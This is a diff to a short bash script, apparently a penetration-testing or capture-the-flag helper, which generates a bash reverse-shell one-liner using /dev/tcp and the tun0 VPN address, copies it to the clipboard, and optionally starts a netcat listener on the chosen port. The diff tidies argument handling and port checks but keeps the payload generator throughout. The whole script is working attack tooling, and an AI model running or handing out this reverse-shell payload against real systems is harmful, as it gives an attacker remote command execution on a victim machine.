@@ -1,28 +1,29 @@
 #!/bin/bash
 
-portlengts=$(printf "$1" | wc -c)
-IP=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
-SHELL="bash -i >& /dev/tcp/$IP/$1 0>\$1"
+if [ "$#" -lt 1 ]; then
+    echo "Usage: $0 <port> [-L]"
+    exit 1
+fi
 
-echo $SHELL
-echo $SHELL | wl-copy
+port="$1"
+IP=$(ip addr show tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
+SHELL="bash -i >& /dev/tcp/$IP/$port 0>&1"
+
+echo "$SHELL"
+echo "$SHELL" | wl-copy
 
 if [ "$UID" -eq 0 ]; then
-    echo "running as root"
-else
-    if [ "$portlengts" -lt 4 ]; then
-        echo "port is not accessible. exiting"
-        exit 0
-    else
-        echo "" > /dev/null
-    fi
+    echo "Running as root. Exiting."
+    exit 1
 fi
 
-if [ -z $2 ]; then
-    exit 0 
-elif [ "$2" == "-L" ]; then
-    echo "starting listener"
-    nc -lvvnp $1 
-else
-    exit 0
+if [ "$port" -lt 1024 ]; then
+    echo "Port is not accessible. Exiting."
+    exit 1
 fi
+
+if [ -n "$2" ] && [ "$2" == "-L" ]; then
+    echo "Starting listener on port $port"
+    nc -lvvnp "$port"
+fi
+
